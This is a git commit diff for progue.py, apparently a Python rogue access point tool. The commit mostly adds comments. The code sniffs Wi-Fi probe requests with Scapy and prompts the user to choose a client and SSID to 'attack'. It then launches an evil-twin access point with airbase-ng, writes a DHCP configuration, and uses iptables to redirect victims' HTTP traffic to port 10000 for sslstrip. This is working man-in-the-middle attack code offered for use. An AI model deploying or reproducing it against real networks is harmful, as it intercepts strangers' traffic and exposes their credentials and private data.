f98cc76043b8a38c31c1c5677c20ad1695dbec30
myst670 <jrme.simon@gmail.com>
2015-09-26 12:17:53 +1000

    modifications according to PEP guide

--- progue.py
+++ progue.py
@@ -3,7 +3,7 @@
 
 import sys
 import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Prevent Scapy from printing IPv6 Error message
 
 try:
     from scapy.all import sniff, Ether, sendp, Dot11, IP 
@@ -21,7 +21,7 @@ from scapy.error import Scapy_Exception
 import argparse
 import time
 
-INDEX = {}
+INDEX = {}  #Dictionary of probes {(MAC Address, SSID probed), N}
 N = 0
 
 
@@ -41,13 +41,13 @@ class Sniffing(threading.Thread):
                 global N
 
                 if (pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 4 and 
-                        pkt.info != "" and not ((pkt.addr2, pkt.info) in INDEX.keys())):
+                        pkt.info != "" and not ((pkt.addr2, pkt.info) in INDEX.keys())): #Filter for probe requests non-received yet
                     
                     N = N + 1
-                    INDEX[(pkt.addr2, pkt.info)] = N
+                    INDEX[(pkt.addr2, pkt.info)] = N     #Add probe information to the INDEX
                     signal_strength = -(256-ord(pkt.notdecoded[-4:-3]))
                     print "[" + str(N) + "] " + "%s               %s         \
-                    %s" % (pkt.addr2, pkt.info, signal_strength)
+                    %s" % (pkt.addr2, pkt.info, signal_strength)     #Print probes received
                     time.sleep(1)
                     
         except Scapy_Exception("Filter parse error"):
@@ -58,7 +58,7 @@ class Sniffing(threading.Thread):
                 """Little trick to stop sniffing properly"""
                 
                 packet_to_string = str(pkt)
-                if packet_to_string.find("1.1.1.1"):
+                if packet_to_string.find("1.1.1.1"):   #Little trick to properly exit sniff function
                     return True
                 else:
                     return False
@@ -68,7 +68,7 @@ class Sniffing(threading.Thread):
             print("Error: Stop function quitted")
             
         try:
-            sniff(filter="", iface=self.monitor_interface, prn=sort, store=0, stop_filter=stop)
+            sniff(filter="", iface=self.monitor_interface, prn=sort, store=0, stop_filter=stop)  #Sniff on the monitor interface (Scapy library)
         except (KeyboardInterrupt, SystemExit, NameError):
             print ""
 
@@ -87,13 +87,13 @@ def choice():
     else:
         print "\nType a number in the range (1,%s)" % (len(INDEX))
         
-        while not number_is_correct:
+        while not number_is_correct:        #Since you don't enter a good number, ask again
             number_to_attack = input("Select which # you want to attack (type a number): ")
             
             if number_to_attack in INDEX.values():
                 for couple, number in INDEX.items():
                     if number == number_to_attack:
-                        client_to_attack, ssid_to_attack = couple
+                        client_to_attack, ssid_to_attack = couple    #Assign value selected to variables
                         number_is_correct = True
                         print "\nYou choosed to attack Client %s with SSID %s\n" % (client_to_attack, ssid_to_attack)
             else:
@@ -101,7 +101,7 @@ def choice():
 
     return ssid_to_attack
      
-def macchanger(monitor_interface, internet_interface): #Not used for the moment
+def macchanger(monitor_interface, internet_interface): #Not used for the moment because airbase-ng is unstable with wrong MAC address
     """Change MAC address of both monitor and internet interface"""
     
     cmd = "ifconfig {0} down ; \
@@ -135,7 +135,7 @@ def fire_up_rogue_ap(ssid_to_attack, monitor_interface, internet_interface):
             iptables -t nat --delete-chain'
 
     try:
-        retcode = subprocess.call(cmd_clean_iptables, stdout=0, shell=True)
+        retcode = subprocess.call(cmd_clean_iptables, stdout=0, shell=True)   #Clear previous iptables
         if retcode < 0:
             print >> sys.stderr, "Child was terminated by signal", -retcode
  
@@ -144,14 +144,14 @@ def fire_up_rogue_ap(ssid_to_attack, monitor_interface, internet_interface):
     
     try:
         proc_rogue_ap = subprocess.Popen(["sudo", "airbase-ng", "-v", 
-                "-c", "6", "-e", ssid_to_attack, monitor_interface])
+                "-c", "6", "-e", ssid_to_attack, monitor_interface])       #Turn on the WIFI Access Point
     except OSError as error:
         print >> sys.stderr, "Execution failed:", error
         proc_rogue_ap.kill()
     except KeyboardInterrupt:
         proc_rogue_ap.kill()
     
-    file_config_dhcp = open("/etc/udhcpd.conf", 'w')
+    file_config_dhcp = open("/etc/udhcpd.conf", 'w')    #Set up DHCP configuration
     file_config_dhcp.write("max_leases 30\nstart 10.1.23.10\nend 10.1.23.100\ninterface at0\ndomain local\noption dns 8.8.8.8\noption subnet 255.255.255.0\noption router 10.1.23.1\nlease 7200\nlease file /tmp/udhcpd.leases")
     file_config_dhcp.close()
 
@@ -160,12 +160,12 @@ def fire_up_rogue_ap(ssid_to_attack, monitor_interface, internet_interface):
     ifconfig at0 up ; \
     ifconfig at0 10.1.23.1 netmask 255.255.255.0 ; \
     echo 1 > /proc/sys/net/ipv4/ip_forward ; \
-    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.2.1:10000 ; \
+    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.1.23.1:10000 ; \
     iptables -t nat -A POSTROUTING -o {0} -j MASQUERADE'.format(internet_interface)
     
     try:
-        dhcp_server = subprocess.Popen(["udhcpd", "/etc/udhcpd.conf"])
-        retcode = subprocess.call(cmd_configuration_ap, stdout=0, shell=True)
+        dhcp_server = subprocess.Popen(["udhcpd", "/etc/udhcpd.conf"])  #Turn on DHCP Server
+        retcode = subprocess.call(cmd_configuration_ap, stdout=0, shell=True)   #Give AP an IP and allow forwarding to internet via port 10000 first to use sslstrip
         
         if retcode < 0:
             print >> sys.stderr, "Child was terminated by signal", -retcode
@@ -213,28 +213,28 @@ def main():
     args = parser.parse_args()
     
     if args.monitor_interface:
-        monitor_interface = args.monitor_interface.lower() 
+        monitor_interface = args.monitor_interface.lower()    #Parse arguments
     if args.internet_interface:
-        internet_interface = args.internet_interface.lower()
+        internet_interface = args.internet_interface.lower()  #Parse arguments
    
-    if not args.SSID:
+    if not args.SSID:     #If no SSID is given, read probe requests
    
         print "[%s] Starting scan \n" % datetime.now()
         print " #     Mac Client                   Probe request             Signal Strength"
     
         try:
             while 1:
-                thread1 = Sniffing(monitor_interface)
+                thread1 = Sniffing(monitor_interface)   #Start sniffing
                 thread1.start()
                 thread1.join(timeout=0.1)
                 time.sleep(2)
         except (KeyboardInterrupt, SystemExit):
             print '\n\n! Received keyboard interrupt, quitting sniffing ! \n'
-            mon_ping = Ether() / IP(src = "1.1.1.1", dst = "127.0.0.1")
+            mon_ping = Ether() / IP(src = "1.1.1.1", dst = "127.0.0.1")    #If KeyboardInterrupt is sent, this packet will be send to match the stop filter from scapy sniffing
             sendp(mon_ping, verbose=False)
         
         choice_correct = False
-        while choice_correct is False:
+        while choice_correct is False:   #Since a symbol or string is sent, retry
             try:
                 ssid_to_attack = choice()
                 choice_correct = True
@@ -246,7 +246,7 @@ def main():
         
         try:
             proc = Process(target=fire_up_rogue_ap, args=(ssid_to_attack, 
-                    monitor_interface, internet_interface))
+                    monitor_interface, internet_interface))         #Turn on Rogue AP with the whole configuration
             proc.start()
             proc.join()
             time.sleep(86400)    
@@ -255,11 +255,11 @@ def main():
             proc.terminate()
         
     
-    else:
+    else:                             #If a SSID is specified, do not read probes and directly fire up the Rogue AP
         ssid_to_attack = args.SSID
         try:
             proc = Process(target=fire_up_rogue_ap, args=(ssid_to_attack, 
-                    monitor_interface, internet_interface))
+                    monitor_interface, internet_interface))         #Turn on Rogue AP with the whole configuration
             proc.start()
             proc.join()
             time.sleep(86400)
